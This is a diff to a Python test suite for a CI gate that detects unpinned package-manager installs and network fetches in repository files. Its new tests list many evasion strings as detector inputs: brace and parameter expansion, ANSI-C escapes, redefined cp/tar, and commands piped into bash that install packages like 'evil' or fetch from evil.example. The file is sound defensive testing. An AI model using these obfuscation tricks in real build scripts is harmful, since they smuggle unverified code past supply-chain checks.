@@ -3,7 +3,9 @@
 REQ: CI-pin-liveness-1 (one format, fail closed), CI-pin-liveness-2 (the hash is the only authority),
 CI-pin-liveness-3 (liveness names each dead source), CI-pin-liveness-4 (every pin and download
 site is covered or owed by a release row), CI-pin-liveness-fu (#6524: the owed lists shrink against
-main, fetch sites are found structurally and counted per file, `live` opens only a zip that matched).
+main, fetch sites are found structurally and counted per file, `live` opens only a zip that matched),
+CI-pin-liveness-fu2 (#6549: this reader and its test are gate files; attribute and dynamic Python reach
+and unchecked package-manager fetches are sites).
 """
 import hashlib
 import io
@@ -13,6 +15,7 @@ import re
 import subprocess
 import sys
 import tempfile
+import time
 import unittest
 import zipfile
 from unittest import mock
@@ -20,6 +23,7 @@ from unittest import mock
 ROOT = pathlib.Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT / "tools"))
 import pins  # noqa: E402
+import premerge  # noqa: E402
 
 A = b"alpha bytes"
 B = b"beta bytes"
@@ -290,7 +294,11 @@ class Repository(unittest.TestCase):
         text = git("show", base.stdout.strip() + ":tools/pins.py")
         self.assertEqual(text.returncode, 0, text.stderr)
         head = (ROOT / "tools/pins.py").read_text()
-        self.assertEqual(pins.grown(text.stdout, head), [])
+        # Raw bytes, not `git diff`, which reads through clean filters and `.gitattributes` (L3 r3 on #6630).
+        same = {f for f in pins.FETCH_NOT_YET if subprocess.run(
+            ["git", "-C", str(ROOT), "show", base.stdout.strip() + ":" + f], capture_output=True).stdout
+            == (ROOT / f).read_bytes()}
+        self.assertEqual(pins.grown(text.stdout, head, same), [])
         # The literals read are the lists in force: nothing later in the file adds to them.
         self.assertEqual(pins.owed(head), {"NOT_YET": {f: None for f in pins.NOT_YET},
                                            "FETCH_NOT_YET": {f: v[1] for f, v in pins.FETCH_NOT_YET.items()}})
@@ -330,6 +338,13 @@ class Grown(unittest.TestCase):
                 'FETCH_NOT_YET = {"x.yml": ("#1", 3), "y.sh": ("#1", 1), "z.py": ("#1", 1)}\n')
         self.assertEqual(pins.grown(self.BASE, head), ["FETCH_NOT_YET raises x.yml from 2 to 3", "FETCH_NOT_YET adds z.py",
                                                        "NOT_YET adds c.pins"])
+
+    def test_a_count_rises_only_for_a_file_whose_bytes_are_unchanged(self):
+        head = 'NOT_YET = {"a.pins": "#1", "b.pins": "#1"}\nFETCH_NOT_YET = {"x.yml": ("#1", 5), "y.sh": ("#1", 4)}\n'
+        self.assertEqual(pins.grown(self.BASE, head, {"x.yml"}), ["FETCH_NOT_YET raises y.sh from 1 to 4"])
+        self.assertEqual(pins.grown(self.BASE, head, {"x.yml", "y.sh"}), [])
+        added = 'NOT_YET = {"a.pins": "#1", "b.pins": "#1", "c.pins": "#1"}\nFETCH_NOT_YET = {"z.sh": ("#1", 1)}\n'
+        self.assertEqual(pins.grown(self.BASE, added, {"c.pins", "z.sh"}), ["FETCH_NOT_YET adds z.sh", "NOT_YET adds c.pins"])
 
     def test_a_base_without_counts_still_refuses_a_new_file(self):
         base = 'NOT_YET = {}\nFETCH_NOT_YET = {"x.yml": "#1"}\n'
@@ -405,6 +420,167 @@ class Sites(unittest.TestCase):
         self.assertEqual(pins.fetch_sites(f, "text"), 1)
         f.write_text("import requests\n")
         self.assertEqual(pins.fetch_sites(f, "python"), 1)
+
+
+class FollowUp2(unittest.TestCase):
+    """CI-pin-liveness-fu2 (#6549)."""
+
+    def test_the_reader_and_its_test_are_gate_files(self):
+        # FETCH_EXEMPT can grow, and this test holds the owed lists shrink-only: each changes only with a
+        # Security accept (`premerge.py --needs-mark` prints `mark` for the files mark_paths returns).
+        for f in ("tools/pins.py", "tests/test_pins.py"):
+            self.assertEqual(premerge.mark_paths([f]), [f], f)
+        for f in ("tools/pins.pyc", "tests/test_pins_x.py", "tools/fetch.pins"):
+            self.assertEqual(premerge.mark_paths([f]), [], f)
+
+    def test_python_reach_by_attribute_or_dynamic_import(self):
+        cases = {
+            "import urllib\nurllib.request.urlopen(u)\n": 1, "import urllib.parse\nurllib.request.urlopen(u)\n": 1,
+            '__import__("urllib").request.urlopen(u)\n': 1,  # a runtime import as a chain base (L3 3 on #6630)
+            'import importlib\nimportlib.import_module("urllib").request.urlopen(u)\n': 1,
+            '__import__("urllib.parse").request.urlopen(u)\n': 1,  # __import__ returns the top package
+            "import urllib as x\nx.request.urlopen(u)\nx.request.Request(v)\n": 1,  # once per file per module
+            "import http\nhttp.client.HTTPSConnection(h)\nimport urllib\nurllib.request.urlopen(u)\n": 2,
+            "import urllib.request\nurllib.request.urlopen(u)\nurllib.request.Request(u)\n": 1,  # the import only
+            "from urllib import request as rq\nrq.urlopen(u)\n": 1,
+            "import urllib\nurllib.parse.quote(u)\n": 0, "requests = []\nrequests.append(1)\n": 0,
+            'out = {"requests": []}\n': 0, "self.urllib.request.x\n": 0,
+            'importlib.import_module("requests")\n': 1, 'import_module("urllib3.util")\n': 1,
+            '__import__("http.client")\n': 1, 'importlib.import_module("json")\n': 0,
+            # An import nested deeper than its use still binds it (L3 1 on #6593).
+            "if True:\n    try:\n        import urllib\n    except ImportError:\n        pass\nr = urllib.request\nr.urlopen(x)\n": 1,
+            "try:\n    if True:\n        import urllib\nexcept ImportError:\n    urllib = None\nu = urllib.request\n": 1,
+            "from importlib import import_module as im\nim('requests')\n": 1, "import xmlrpc.client\n": 1,
+            # Every binding of a name is resolved, not the last (Potency R3 on #6593).
+            "import urllib as u\ndef f():\n    import os as u\nu.request.urlopen(1)\n": 1,
+        }
+        for text, n in cases.items():
+            with self.subTest(text=text):
+                self.assertEqual(pins.py_sites(text), n)
+
+    def test_package_manager_fetches_their_own_check_misses(self):
+        for text in ["pip install foo==1", "python3 -m pip install x", '"$V/bin/pip" -q install x', "pip3.12 download x",
+                     "cd d && pip install -r r.txt", "npm install x", "npm i", "yarn add x", "pnpm dlx x", "npx foo",
+                     "sudo npx foo", "GOSUMDB=off go install x@v1", "GONOSUMDB=x go get y", "GOFLAGS=-insecure go get x",
+                     "export GOPRIVATE=x", "GOINSECURE=x go mod download",
+                     "pip install foo==1  # TODO: --require-hashes once #6588 lands", "time npx foo",
+                     "timeout 60 npx foo", "nohup npx foo", "xargs npx foo", "nice -n 5 npx foo", "yarn install",
+                     "pnpm install", "npm install evil --frozen-lockfile", "npm i x --immutable",
+                     "yarn add evil --frozen-lockfile", "pnpm add evil --frozen-lockfile", "yarn",
+                     # No flag is credited to yarn or pnpm: yarn 1 ignores --immutable (L3 2, Potency 2 on #6593).
+                     "yarn install --immutable", "yarn install --frozen-lockfile", "pnpm i --frozen-lockfile",
+                     # Comment and flag tests read raw words, not basenames (L3 1, Potency 1 on #6593).
+                     "PIP_CACHE_DIR=/tmp/#c pip install foo", "HOME=/tmp/#x pip install foo",
+                     "pip install --index-url https://h/--require-hashes foo",
+                     "sudo -u bob npx foo", "timeout -s KILL 60 npx foo", "xargs -I % npx foo %",
+                     # Fail closed (step back on #6593): a `#` word never hides a name, and no credit is read
+                     # from a line whose quotes or backslashes move a word, command or comment boundary.
+                     'X="a #b" pip install foo', "X='a #b' pip install foo", 'X="a #b" npx foo',
+                     "pip --cache-dir '#d' install foo", "npm --prefix '#p' install evil", "# pip install foo",
+                     'env "A=;"tar npx foo', 'pip install foo "x --require-hashes"',
+                     "pip install foo\\ --require-hashes", "pip install --require-hashes foo 'x",
+                     # Deny by default (Security and L3 on #6630): every manager word the broad split finds counts
+                     # unless a whole word is a known-safe form; an option can take no credit word as its value.
+                     "pip install --log --require-hashes foo", "pip install --no-binary --require-hashes foo",
+                     "npm in foo", "npm isntall foo", "npm it", "npm update", "npm up evil", "npm init vite",
+                     "npm create vite", "{npm,install,foo}", "{pip,install,foo}", "{npx,cowsay}", "npx${IFS}cowsay",
+                     "npm${IFS}install foo", "python3 -mpip install foo", "pip wheel foo", "pip3 wheel -w d evil",
+                     "P=pip; $P install evil", "N=npx; $N evil", "{pip,} install evil", "tar -I npx -xf a.tar",
+                     "echo ok  # npx foo", "npm ci evil", "npm ci $X", "pip install --require-hashes foo",
+                     "tar x $n/bin/npx", "pip install -r --require-hashes",
+                     # L3 and Security on #6630 at b77d7006: no credit for a `-r` URL (its hashes are the
+                     # server's), a tar that may run a program, or a glob; names glued to options and variants count.
+                     "pip install --require-hashes -r https://evil.example/r.txt",
+                     "pip install --require-hashes --requirement=https://evil.example/r.txt",
+                     "pip install --require-hashes -r r.txt -r https://x/y", "/usr/bin/pi[p] install evil",
+                     "/usr/local/bin/pi? install evil", "/usr/bin/pip* install evil", "tar cIf yarn o.tar f",
+                     "tar -cf o.tar -Iyarn f", "env -Syarn", "env -Snpx", "yarnpkg add x", "pip-3.12 install x",
+                     "pip-3 install x", "node /usr/lib/node_modules/npm/bin/npm-cli.js install foo", "node yarn.js",
+                     "tar xIf npx a.tar", 'tar --to-command=x -xf a "$n/bin/npx"',
+                     "pi[p] install --require-hashes -r r.txt",
+                     # L3 on #6630 at 970041e7: `name@version` and corepack count; neither earns credit.
+                     "yarn@1.22.22 add x", "npm@10 ci", "corepack enable", "pip@x install --require-hashes -r r.txt",
+                     # Security on #6630 at 970041e7: make's `@`, `+` and `-` recipe prefixes hide no name or
+                     # fetcher, and a manager path handed to another command earns no credit.
+                     "\t@yarn install", "\t@npm install evil", "\t@pip install foo", "\t+yarn add evil",
+                     "\t@-yarn add x", "\t@curl -o x https://h/x", "\t+wget x", 'cp() { "$@"; }\ncp yarn add evil',
+                     'cp() { "$@"; }\ntar x "$n/bin/npx"', 'function tar { :; }\ntar x "$n/bin/npx"',
+                     'alias tar=x\ntar x "$n/bin/npx"', '. ./lib.sh\ntar x "$n/bin/npx"',
+                     'source lib.sh\ntar x "$n/bin/npx"', "tar x npx", "echo npm", "\t@pi[p] install x", "tar -cf o.tar -Ipi[p] f",
+                     # Step back on #6630 at 896bcf5a (L3 and Security): no file-tool credit, since a path given to
+                     # a file tool can be printed into a shell, renamed and run, or run by a redefined tool.
+                     "echo /usr/bin/pip install evil | bash", "echo /n/npx evil | sh",
+                     "echo /usr/bin/npm i evil > s.sh; sh s.sh", "cp /usr/bin/npx ./x && ./x evil",
+                     "mv /n/pip /n/q; /n/q install evil", "tar xOf a.tar /n/npx | sh",
+                     'eval cp\\(\\)\\ \\{\\ \\"\\$@\\"\\;\\ \\}\ncp /usr/bin/yarn add evil',
+                     "cp ./node_modules/.bin/yarn add evil",  # b.sh, run after a.sh's `cp() { "$@"; }` and `export -f cp`
+                     "PATH=./shim:$PATH\ncp ./node_modules/.bin/yarn add evil", "tar 'x' \"$n/bin/npx\""]:
+            with self.subTest(text=text):
+                self.assertEqual(pins.text_sites(text), 1)
+        # L3 on #6630 at aae15ad0: a static expansion hides no name (parameter defaults and other operands,
+        # brace lists and sequences, nested too, and empty substitutions), for fetchers as for managers.
+        for text in ["${X:-npm} install evil", '"${X:-npm}" install evil', "${X-npm} install evil", "{n,}pm i evil",
+                     "n{p,}m i evil", "{np,x}m i evil", "p{i,}p install evil", "${C:-curl} https://e",
+                     "cu{r,}l -o x https://e", "n$()pm i", "n``pm i", '"${X:-npm i}" evil', "${X:=pip} install x",
+                     "${X:+wget} x", "${X/#/npm} i", "${A:-${B:-yarn}} add x", "{n..n}pm i",
+                     # Thread qb76so on eebc2d80: an unset variable, a substitution that prints nothing, an empty
+                     # `$''` or `$""` and an ANSI-C escape each glue a name, and bash runs it.
+                     "n${X}pm i x", "n$X\"\"pm i x", "n$(true)pm i x", "n`true`pm i x", "n$''pm i x", 'n$""pm i x',
+                     "$'\\x6e'pm i x", "$'\\156\\160\\155' i x", "c${X}url https://e", "$'\\x63url' https://e"]:
+            with self.subTest(text=text):
+                self.assertEqual(pins.text_sites(text), 1)
+        self.assertEqual(pins.yaml_sites("steps:\n  - run: ${X:-npm} install evil\n"), 1)
+        # L3 fix-list on #6630 at caf4aa66: a subscripted unset variable and an Actions expression that renders
+        # empty each glue the words around them.
+        for text in ["n${X[0]}pm i evil", "n${X[@]}pm i evil", "n${X[*]}pm i evil", "n$'\\0'pm i evil",
+                     "n$'\\x00'pm i evil", "n${X~}pm i evil", "n${X~~}pm i evil", "n${X@U}pm i evil", "n${X,,}pm i evil",
+                     "n${X^^}pm i evil"]:
+            with self.subTest(text=text):
+                self.assertEqual(pins.text_sites(text), 1)
+        for text in ["n${{ '' }}pm i evil", "n${{ toJSON('') }}pm i evil", "n${{ github.x }}pm i evil"]:
+            with self.subTest(text=text):
+                self.assertEqual(pins.yaml_sites('steps:\n  - run: "%s"\n' % text), 1)
+        self.assertEqual(pins.yaml_sites("steps:\n  - run: echo ${{ github.sha }}\n"), 0)
+        # Security fix-list on #6630 at caf4aa66: past the cap a line is refused, never counted, and a repeated
+        # reading is kept once, so `{a,a}` repeats stay linear.
+        with self.assertRaisesRegex(pins.PinError, "more than 256 readings"):
+            pins.text_sites("x{a,b}" * 9)
+        start = time.monotonic()
+        self.assertEqual(pins.text_sites("{a,a}" * 200 + " ${X:-${Y:-${Z:-q}}}" * 3), 0)
+        self.assertLess(time.monotonic() - start, 2)
+        self.assertEqual(pins.text_sites("n$(:)pm i"), 1)
+        # L3 pre-probe on #6630 at eebc2d80: an Actions expression renders its literals before shell runs.
+        for run in ["${{ 'n' }}pm install evil", "${{ format('{0}pm', 'n') }} i", "${{ 'n' }}${{ 'p' }}m i",
+                    "${{ x && 'n' || 'q' }}pm i", "${{ fromJSON('\"\\u006epm\"') }} i", "c${{ 'u' }}rl https://e"]:
+            with self.subTest(run=run):
+                self.assertGreaterEqual(pins.yaml_sites("steps:\n  - run: " + run + "\n"), 1)
+        for run in ["${{ github.event_name == 'npm' }}", "${{ hashFiles('npm.lock') }}", "${{ matrix.os }}pm",
+                    "${{ startsWith(github.ref, 'pip') && 'x' }}"]:
+            with self.subTest(run=run):
+                self.assertEqual(pins.gh_sites("run: " + run), 0)
+        self.assertEqual(pins.text_sites("n$(curl x)pm i"), 2)  # the substitution's own fetcher, and the glued npm
+        for text in ["${X:-default} run", "echo {a,b}", "${X%.sh}", "{ echo; }", "echo $HOME ${X} $(date)",
+                     "echo $'a\\tb'"]:
+            with self.subTest(text=text):
+                self.assertEqual(pins.text_sites(text), 0)
+        # Security 2(b) on #6630: a job's BASH_ENV script can redefine `cp` for every bash run step.
+        self.assertEqual(pins.yaml_sites("jobs:\n  j:\n    env:\n      BASH_ENV: ./ci/fns.sh\n    steps:\n"
+                                         "      - run: cp ./node_modules/.bin/yarn add evil\n"), 1)
+        for text in ['tar x "$n/bin/npx" "$n/bin/npm"', "tar x $n/bin/npx; mv $n/bin/npx q; q evil",
+                     'tar -xJf "$w/n.tar.xz" --strip-components=1 -C usr/local "$n/bin/npm" "$n/bin/npx"']:
+            with self.subTest(text=text):
+                self.assertEqual(pins.text_sites(text), 2)
+        for text in ["corepack yarn@1 add x", "corepack pnpm@8 i"]:  # corepack and the manager it runs
+            with self.subTest(text=text):
+                self.assertEqual(pins.text_sites(text), 2)
+        for text in ["pip install --require-hashes -r r.txt", "python -m pip install --no-deps --require-hashes \\\n  -r r.txt",
+                     "npm ci --ignore-scripts", "go install x@v1.2.3", "go mod download",
+                     "pip list", "GOSUMDB=sum.golang.org go get x", "set -o pipefail", "pipx run x", "cat npm.log",
+                     'pip install --require-hashes -r "$R"', "pip show x",
+                     "python -m pip install --no-deps --only-binary=:all: --require-hashes -r tests/requirements.txt"]:
+            with self.subTest(text=text):
+                self.assertEqual(pins.text_sites(text), 0)
+        self.assertEqual(pins.py_sites('subprocess.run("pip install x", shell=True)\n'), 1)
 
 
 if __name__ == "__main__":
